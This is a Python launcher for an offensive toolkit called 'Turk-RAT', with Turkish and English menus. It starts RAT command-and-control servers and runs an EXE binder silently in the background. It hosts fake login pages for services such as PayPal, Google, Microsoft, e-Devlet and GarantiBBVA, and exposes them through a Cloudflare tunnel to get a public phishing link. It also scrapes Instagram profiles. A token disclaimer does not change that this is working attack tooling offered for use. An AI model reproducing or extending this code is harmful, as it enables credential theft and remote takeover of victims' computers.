#!/usr/bin/env python3
"""
Turk-RAT + OSINT + Phishing + EXE Binder CLI Panel
Yazar: Kiokhan (meterplord)
GitHub: github.com/meterplord/TurkRAT
"""

import os
import sys
import subprocess
import time
import threading
import re
import tkinter as tk
from tkinter import scrolledtext

from colorama import Fore, Style, init
init(autoreset=True)

# ============== DİL SİSTEMİ ==============
class Lang:
    def __init__(self):
        self.lang = "tr"

        self.tr = {
            "select_lang": "Lütfen dil seçin / Please select language",
            "lang_tr": "Türkçe",
            "lang_en": "English",
            "enter_choice": "Seçim yap → [1-4]: ",
            "main_menu": """
1) Turk-RAT (RAT Tools)
2) OSINT Tools(Beta)
3) Phishing Tools(Beta)
4) EXE Binder

Uyarı: Bu toolu kullanırken lütfen illegal yerlerde kullanmayınız ve sorumluluk kabul etmiyorum
                         github: https://github.com/meterplord/
                                Developer: meterplord

0) Çıkış""",
            "payload_menu": "═══════ PAYLOAD SEÇİMİ ═══════\n1) Linux Payload\n2) Windows Payload\n0) Geri",
            "osint_menu": "═══════ OSINT TOOLS ═══════\n1) Foto OSINT (EXIF)\n2) Sys OSINT (Sosyal Platformlar)\n3) Insta OSINT (Instagram)\n0) Geri",
            "phishing_menu": """════════ PHISHING TOOLS ════════
1) Cloudflare 
2) Discord
3) Drobbox
4) e-bay
5) Facebook
6) Google
7) İnstagram
8) Microsoft
9) PayPal
10) spotify
11) Steam
12) TikTok
13) Trendyol
14) Twich
15) Twitter
16) Yeni google
 0) Geri""",
            "binder_starting": "[+] EXE Binder başlatılıyor...",
            "binder_not_found": "[!] exebinder.py veya linux_exebinder.py bulunamadı!",
            "invalid_choice": "[!] Geçersiz seçim!",
            "exit_msg": "Çıkış yapılıyor... Görüşürüz kral!",
        }

        self.en = {
            "select_lang": "Lütfen dil seçin / Please select language",
            "lang_tr": "Türkçe",
            "lang_en": "English",
            "enter_choice": "Choose → [1-4]: ",
            "main_menu": """
1) Turk-RAT (RAT Tools)
2) OSINT Tools
3) Phishing Tools
4) EXE Binder

Warning: Do not use this tool for illegal purposes. I am not responsible.
                         github: https://github.com/meterplord/
                                Developer: meterplord

0) Exit""",
            "payload_menu": "═══════ PAYLOAD SELECTION ═══════\n1) Linux Payload\n2) Windows Payload\n0) Back",
            "osint_menu": "═══════ OSINT TOOLS ═══════\n1) Photo OSINT (EXIF)\n2) Sys OSINT (Social Platforms)\n3) Insta OSINT (Instagram)\n0) Back",
            "phishing_menu": """════════ PHISHING TOOLS ════════
 1) Cloudflare      2) Discord       3) Dropbox      4) e-Bay
 5) e-Devlet        6) Facebook      7) GarantiBBVA  8) Google
 9) Instagram      10) Microsoft    11) PayPal      12) Spotify
13) Steam          14) TikTok       15) Trendyol    16) Twitch
17) Twitter        18) New Google
 0) Back""",
            "binder_starting": "[+] EXE Binder starting in background...",
            "binder_not_found": "[!] exebinder.py or linux_exebinder.py not found!",
            "invalid_choice": "[!] Invalid choice!",
            "exit_msg": "Exiting... See you king!",
        }

    def t(self, key):
        return (self.en if self.lang == "en" else self.tr).get(key, key)

lang = Lang()

# ============== LOGO ==============
LOGO = f"""
{Fore.RED}██████████╗{Fore.RED}██╗   ██╗ {Fore.RED}██████╗  {Fore.RED}██    ██{Fore.WHITE}  ---██████╗ {Fore.WHITE}   ███████  {Fore.WHITE} ██████████
{Fore.RED}╚═══╗██╔═╝ {Fore.RED}██║   ██║ {Fore.RED}██╔══██╗ {Fore.RED}██   ██║{Fore.WHITE}--- ██╔══ ██╗{Fore.WHITE}  ██╔══  ██║{Fore.WHITE}     ██╔
{Fore.RED}   ╔╝██║   {Fore.RED}██║   ██║ {Fore.RED}██████╔╝ {Fore.RED}█████╔╝{Fore.WHITE}   ---██████╔╝{Fore.WHITE}   ███████  {Fore.WHITE}     ██
{Fore.RED}   ╚╗██║   {Fore.RED}██║   ██║ {Fore.RED}██╔══██╗ {Fore.RED}██╔═██╗ {Fore.WHITE}-- -██╔══ ██╗{Fore.WHITE}  ██╔══  ██║{Fore.WHITE}     ██╔
{Fore.RED}    ╚██╗  {Fore.RED}╚ ██████╔╝ {Fore.RED}██║  ██║ {Fore.RED}██║  ██║{Fore.WHITE}--  ██║   ██║{Fore.WHITE}  ██║    ██║{Fore.WHITE}     ██║  
{Fore.RED}    ╗██╗    {Fore.RED} ╚═════╝  ╚═╝ {Fore.RED}╚═╝  ╚═╝ {Fore.RED}╚═╝  ╚═╝{Fore.WHITE}---╚═╝  ╚═╝{Fore.WHITE}    ╝    ╚    {Fore.WHITE}     ╚═╝  
{Style.RESET_ALL}
{Fore.CYAN}══════════════════════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""

# ============== GUI ==============
def show_result_gui(title, data):
    root = tk.Tk()
    root.title(title)
    root.geometry("1000x700")
    root.configure(bg="#000000")
    text = scrolledtext.ScrolledText(root, bg="#0d0d0d", fg="#00ff00", font=("Consolas", 12), insertbackground="#00ff00")
    text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    text.insert(tk.END, data)
    text.config(state=tk.DISABLED)
    root.protocol("WM_DELETE_WINDOW", root.destroy)
    root.mainloop()

# ============== PHISHING KLASÖR KONTROL ==============
def check_cc_folder():
    if not os.path.exists("CC"):
        os.makedirs("CC", exist_ok=True)

# ============== EXE BINDER ==============
def run_exebinder():
    binder_files = ["exebinder.py", "linux_exebinder.py"]
    binder_path = None
    for file in binder_files:
        if os.path.exists(file):
            binder_path = file
            break
    if not binder_path:
        print(f"{Fore.RED}{lang.t('binder_not_found')}{Style.RESET_ALL}")
        time.sleep(2)
        return
    print(f"{Fore.GREEN}{lang.t('binder_starting')} ({binder_path}){Style.RESET_ALL}")
    subprocess.Popen(
        ["python3", binder_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    )
    time.sleep(1.5)

# ============== RAT MENÜ ==============
def run_turk_rat():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(LOGO)
        print(f"{Fore.MAGENTA}{lang.t('payload_menu')}{Style.RESET_ALL}")
        choice = input(f"{Fore.CYAN}→ [0-2]: {Style.RESET_ALL}").strip()
        if choice == "0": return
        elif choice == "1":
            print(f"{Fore.GREEN}[+] Linux C2 başlatılıyor...{Style.RESET_ALL}")
            subprocess.run(["python3", "linux_server.py"])
        elif choice == "2":
            print(f"{Fore.GREEN}[+] Windows C2 başlatılıyor...{Style.RESET_ALL}")
            subprocess.run(["python3", "windows_server.py"])
        else:
            print(f"{Fore.RED}{lang.t('invalid_choice')}{Style.RESET_ALL}")
            time.sleep(1)

# ============== OSINT FONKSİYONLARI ==============
def run_foto_osint():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    print(f"{Fore.GREEN}[+] Foto OSINT başlatılıyor...{Style.RESET_ALL}")
    subprocess.run(["python3", "foto_osint.py"])
    input(f"{Fore.YELLOW}\nENTER'a bas devam etmek için...{Style.RESET_ALL}")

def run_sys_osint():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    username = input(f"{Fore.CYAN}Kullanıcı adı gir: {Style.RESET_ALL}").strip()
    if not username:
        print(f"{Fore.RED}[!] Boş olamaz!{Style.RESET_ALL}")
        time.sleep(1); return
    use_tor = input(f"{Fore.YELLOW}Tor kullan? (e/h): {Style.RESET_ALL}").lower() in ['e', 'y']
    args = ["python3", "sys_osint.py", username] + (["--tor"] if use_tor else [])
    print(f"{Fore.YELLOW}[*] Tarama yapılıyor...{Style.RESET_ALL}")
    result = subprocess.run(args, capture_output=True, text=True)
    show_result_gui("Sys OSINT Sonuçları", result.stdout + "\n" + result.stderr)

def run_insta_osint():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    username = input(f"{Fore.CYAN}Instagram kullanıcı adı: @{Style.RESET_ALL}").strip()
    if not username:
        print(f"{Fore.RED}[!] Boş olamaz!{Style.RESET_ALL}")
        time.sleep(1); return
    print(f"{Fore.YELLOW}[*] @{username} profili çekiliyor...{Style.RESET_ALL}")
    def fetch():
        try:
            import instaloader
            L = instaloader.Instaloader()
            profile = instaloader.Profile.from_username(L.context, username)
            result = f"""
Username       : {profile.username}
Ad Soyad       : {profile.full_name}
Takipçi        : {profile.followers:,}
Takip Edilen   : {profile.followees:,}
Gönderi        : {profile.mediacount}
Biyografi      : {profile.biography}
Profil Foto    : {profile.profile_pic_url}
Özel Hesap     : {'Evet' if profile.is_private else 'Hayır'}
Doğrulanmış    : {'Evet' if profile.is_verified else 'Hayır'}
Link           : {profile.external_url or 'Yok'}
            """.strip()
            show_result_gui("Instagram OSINT", result)
        except Exception as e:
            show_result_gui("Hata", str(e))
    threading.Thread(target=fetch, daemon=True).start()
    input(f"{Fore.YELLOW}\nİşlem arka planda devam ediyor, ENTER ile dön...{Style.RESET_ALL}")

# ============== PHISHING ==============
def start_phishing(platform):
    php_dir = f"CC/{platform}"
    if not os.path.exists(php_dir):
        print(f"{Fore.RED}[!] Klasör yok: {php_dir}{Style.RESET_ALL}")
        input("ENTER...")
        return
    print(f"{Fore.GREEN}[+] {platform.upper()} Phishing başlatılıyor...{Style.RESET_ALL}")
    php = subprocess.Popen(["php", "-S", "localhost:8000"], cwd=php_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cf = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    print(f"{Fore.YELLOW}[*] Cloudflare tüneli açılıyor...{Style.RESET_ALL}")
    url = None
    for line in cf.stdout:
        m = re.search(r"https://[^\s]+?\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    if url:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(LOGO)
        print(f"{Fore.GREEN}PHISHING LİNKİ HAZIR!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Durdurmak için ENTER bas...{Style.RESET_ALL}")
        input()
    else:
        print(f"{Fore.RED}[!] Cloudflare link alınamadı!{Style.RESET_ALL}")
        input("ENTER...")
    php.terminate()
    cf.terminate()

def phishing_menu():
    check_cc_folder()
    plats = ["cloudflare","discord","dropbox","e-bay","facebook","google","instagram","microsoft","paypal","spotify","steam","tiktok","twitch","twitter","yeni google"]
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(LOGO)
        print(f"{Fore.RED}{lang.t('phishing_menu')}{Style.RESET_ALL}")
        choice = input(f"{Fore.CYAN}→ [0-18]: {Style.RESET_ALL}").strip()
        if choice == "0": break
        if choice in [str(i) for i in range(1, 19)]:
            start_phishing(plats[int(choice)-1])
        else:
            print(f"{Fore.RED}{lang.t('invalid_choice')}{Style.RESET_ALL}")
            time.sleep(1)

def osint_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(LOGO)
        print(f"{Fore.MAGENTA}{lang.t('osint_menu')}{Style.RESET_ALL}")
        choice = input(f"{Fore.CYAN}→ [0-3]: {Style.RESET_ALL}").strip()
        if choice == "1": run_foto_osint()
        elif choice == "2": run_sys_osint()
        elif choice == "3": run_insta_osint()
        elif choice == "0": break
        else:
            print(f"{Fore.RED}{lang.t('invalid_choice')}{Style.RESET_ALL}")
            time.sleep(1)

# ============== ANA MENÜ ==============
def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(LOGO)
        print(lang.t("main_menu"))
        choice = input(f"{Fore.CYAN}{lang.t('enter_choice')}{Style.RESET_ALL}").strip()

        if choice == "1": run_turk_rat()
        elif choice == "2": osint_menu()
        elif choice == "3": phishing_menu()
        elif choice == "4": run_exebinder()
        elif choice in ["0", "exit", "quit"]:
            print(f"{Fore.RED}{lang.t('exit_msg')}{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}{lang.t('invalid_choice')}{Style.RESET_ALL}")
            time.sleep(1)

# ============== DİL SEÇİMİ ==============
def select_language():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    print(f"{Fore.YELLOW}{lang.t('select_lang')}{Style.RESET_ALL}")
    print(f"1) {lang.t('lang_tr')}")
    print(f"2) {lang.t('lang_en')}")
    while True:
        ch = input(f"{Fore.CYAN}→ ").strip()
        if ch == "1":
            lang.lang = "tr"
            break
        elif ch == "2":
            lang.lang = "en"
            break
        else:
            print(f"{Fore.RED}[!] 1 veya 2 gir!{Style.RESET_ALL}")

# ============== BAŞLAT ==============
if __name__ == "__main__":
    try:
        select_language()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}{lang.t('exit_msg')}{Style.RESET_ALL}")
